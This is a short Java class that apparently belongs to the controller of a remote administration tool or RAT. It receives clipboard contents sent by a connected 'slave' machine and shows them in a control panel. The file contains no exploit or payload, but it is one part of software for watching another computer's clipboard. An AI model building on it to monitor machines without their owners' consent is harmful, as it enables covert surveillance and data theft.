package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlClipboard;

public class PacketCBOARDC extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String content = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlClipboard panel = (PanelControlClipboard) frame.panels.get("clipboard");
			panel.getPane().setText(content);
		}
	}

}
